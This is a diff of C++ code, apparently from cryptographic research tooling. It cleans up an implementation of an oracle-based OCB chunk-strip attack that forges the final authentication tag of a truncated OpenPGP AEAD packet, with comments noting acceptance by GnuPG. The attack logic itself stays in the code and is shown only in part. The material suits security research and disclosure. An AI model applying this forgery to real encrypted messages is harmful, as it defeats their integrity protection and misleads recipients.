@@ -308,62 +308,26 @@ const cipher_block_t<AES_BLOCK_SIZE> offset0_from_nonce(uint32_t iter,
     }
     else
     {
-        // std::cerr << "AEAD packet:\n" << aead_packet.to_string() << "\n";
         throw Exception(std::format("unsupported cipher type {}", static_cast<uint8_t>(aead_packet.cipher())));
     }
     auto enc = Botan::BlockCipher::create(cipher_spec);
     L_computer l_computer(encrypted_zero_block);
 
-    /*std::vector<aead_chunk_t> chunks = aead_packet.aead_chunks();
-    std::cout << std::format("#chunks: {}\n", chunks.size());
-    if (chunks.size() < 1)
-    {
-        throw Exception(
-            "Provided AEAD packet has less than one chunk, (this simple) chunk removal attack is thus impossible.
-    Aborting.");
-    }*/
     aead_packet_t mod_aead_packet(aead_packet);
     auto stripped_chunks = aead_packet.aead_chunks();
     stripped_chunks.pop_back();
     stripped_chunks.pop_back();
     mod_aead_packet.set_chunks(stripped_chunks);
 
-    // std::vector<uint8_t> add_data_final_orig = determine_add_data_for_chunk(aead_packet, 0, true);
     std::vector<uint8_t> add_data_final_mod = determine_add_data_for_chunk(mod_aead_packet, 0, true);
 
-    // std::cout << std::format("add_data_final_orig = {}\n", Botan::hex_encode(add_data_final_orig));
     std::cout << std::format("add_data_final_mod  = {}\n", Botan::hex_encode(add_data_final_mod));
 
-    /* 2024-03-25:
-add_data_final_orig = D40109020000000000000000050000000000000104
-add_data_final_mod  = D40109020000000000000000040000000000000100 OUTDATED, NOW REMOVING 2 CHUNKS
-     *
-     */
-
-    /*std::cout << "add data lengths:\n";
-    for(std::size_t idx : std::set<size_t>{0,1})
-    {
-       std::cout << std::format("  [{}]: {}\n", idx, add_data[idx].size());
-    }*/
 
 
     std::cout << std::format("OCB-IV: {}\n", Botan::hex_encode(aead_packet.iv()));
-#if 0
-    for(size_t i = 0; i < 2; i++)
-    {
-        std::cout << std::format("chunk[{}].encrypted = {}\n", i, Botan::hex_encode(chunks[i].encrypted));
-        std::cout << std::format("chunk[{}].auth_tag = {}\n", i, Botan::hex_encode(chunks[i].auth_tag));
-        std::cout << std::format("add_data[{}] = {}\n", i, Botan::hex_encode(add_data[i]));
-        std::vector<uint8_t> nonce = aead_packet.iv();
-        nonce[nonce.size() - 1] ^= i;
-        std::cout << std::format("nonce[{}]: {}\n", i, Botan::hex_encode(nonce));
-    }
-#endif
 
     // parse the add. data into full blocks and potentially trailing non-full block:
-    // std::array<cipher_block_vec_t<AES_BLOCK_SIZE>::full_blocks_and_trailing_t, 2> add_data_blocks_and_trail;
-    // add_data_blocks_and_trail[0] =
-    // cipher_block_vec_t<AES_BLOCK_SIZE>::parse_to_blocks_and_trailing(add_data_final_orig);
     cipher_block_vec_t<AES_BLOCK_SIZE>::full_blocks_and_trailing_t add_data_blocks_and_trail;
 
     add_data_blocks_and_trail = cipher_block_vec_t<AES_BLOCK_SIZE>::parse_to_blocks_and_trailing(add_data_final_mod);
@@ -381,8 +345,6 @@ add_data_final_mod  = D40109020000000000000000040000000000000100 OUTDATED, NOW R
     }
 
     std::cout << std::format("OCB hash: full blocks: offsets = {}\n", F.hex());
-    // 2024-03-26: 00000000000000000000000000000000
-    // should be:  5A0CF529530563C7BEEFF34B38805E2A
 
     // F_0 is not used for the actual computations
     F.erase(F.begin());
@@ -413,8 +375,6 @@ add_data_final_mod  = D40109020000000000000000040000000000000100 OUTDATED, NOW R
             }
             F.push_back(prev_block ^ L_star);
             std::cout << std::format("OCB hash: trailing: offset = {}\n", F[F.size() - 1].hex());
-            // 2024-03-26:  CC8FC86307C43B3651540F99F6A049E3 ✓
-            // expl. comp.: CC8FC86307C43B3651540F99F6A049E3
         }
     }
 
@@ -450,13 +410,11 @@ add_data_final_mod  = D40109020000000000000000040000000000000100 OUTDATED, NOW R
                              msg_file_path);
     std::cout << "... OCB chunk strip attack: first oracle query completed\n";
 
-    // std::cout << "... OCB chunk strip attack is not completely implemented\n";
     // parse g as S_1 || . . . || S_n || S'_1 . . . || S'_n with N
     if (ecb_encr_blocks_from_oracle.size() != oracle_ciphertext_blocks.size())
     {
         throw Exception("invalid size of result returned from 2nd oracle query for OCB block strip attack");
     }
-    // size_t cnt_split = 0
     cipher_block_t<AES_BLOCK_SIZE> S_xor_sum;
     for (cipher_block_t<AES_BLOCK_SIZE> const& block : ecb_encr_blocks_from_oracle)
     {
@@ -465,11 +423,9 @@ add_data_final_mod  = D40109020000000000000000040000000000000100 OUTDATED, NOW R
     cipher_block_t<AES_BLOCK_SIZE> new_final_tag = S_xor_sum; // = HASH(K, A)
     
     std::cout << std::format("OCB hash result = {}\n", S_xor_sum.hex());
-    // 2024-03-26: 20CFE1468807AA36CD06A77E7983E24A 🗲
-    // according to expl. comp.: 945DA4DE430538FA1B38A57F20D0775D
 
     //  blockEncrypt_k ( F_0 ⊕ L_$ ) ⊕ HASH(K, A)
-    std::vector<uint8_t> nonce = aead_packet.iv(); // 2057E8A5B09262C399588E2B8D334E
+    std::vector<uint8_t> nonce = aead_packet.iv();
     // ignore excess nonce octets
     if (nonce.size() > 15)
 
@@ -486,14 +442,10 @@ add_data_final_mod  = D40109020000000000000000040000000000000100 OUTDATED, NOW R
     nonce[14] ^= new_final_chunk_idx;
     std::cout << "nonce for tag computation of final empty chunk: " << Botan::hex_encode(nonce) << std::endl;
 
-    // 2024-03-26: 2057E8A5B09262C399588E2B8D334A NOW OUTDATED
-    // should be IV ⊕ 0x4 => E ⊕ A = 4 ✓ => NOW 3
 
     cipher_block_t<AES_BLOCK_SIZE> F_0 = offset0_from_nonce(
         iter, ctl, vec_ct, pkesk, session_key, decr_params, msg_file_path, nonce.data(), nonce.size());
     std::cout << std::format("F_0 for encryption: {}\n", F_0.hex());
-    // 2024-03-26: F_0      = 4016F56F1B7DBEE38BB1A3E5C679D48B ✓
-    // F_0 from expl. comp. = 4016F56F1B7DBEE38BB1A3E5C679D48B
     cipher_block_t<AES_BLOCK_SIZE> F0_xor_Ldollar(l_computer.dollar());
     F0_xor_Ldollar ^= F_0;
 
@@ -516,24 +468,8 @@ add_data_final_mod  = D40109020000000000000000040000000000000100 OUTDATED, NOW R
     }
     new_final_tag ^= ecb_encr_F0_xor_Ldollar_block_from_oracle[0];
     std::cout << "new final tag of final empty chunk computed in attack: " << Botan::hex_encode(new_final_tag) << std::endl;
-    // should be according to explicit computation: 8637FF5AFC8535EBE80E23D2E81F701F (accepted by GnuPG)
-    // is 2024-03-26:                               32A5BAC23787A7273E3021D3B14CE508 
 
-    // ======================================================================================//
-    // HACK FOR TESTING                                                                      //
-    //new_final_tag = Botan::hex_decode("8637FF5AFC8535EBE80E23D2E81F701F");                   //
-    //                                                                                       //
-    // ======================================================================================//
     mod_aead_packet.set_final_auth_tag(new_final_tag.to_uint8_vec());
-#if 0
-    std::vector<aead_chunk_t> first_two_new_chunks = { 
-        {.encrypted = aead_packet.aead_chunks()[1].encrypted, .auth_tag = new_tags[0].to_uint8_vec() },  
-        {.encrypted = aead_packet.aead_chunks()[0].encrypted, .auth_tag = new_tags[1].to_uint8_vec() }
-    };
-    aead_packet_t mod_aead_packet(aead_packet); 
-    mod_aead_packet.rewrite_chunk(first_two_new_chunks[0], 0);
-    mod_aead_packet.rewrite_chunk(first_two_new_chunks[1], 1);
-#endif
     auto encoded_mod_aead_packet = mod_aead_packet.get_encoded();
     ctl.potentially_write_run_time_file(encoded_mod_aead_packet,
                                         std::format("{}-aead-packet-with-final-chunk-removed", iter));
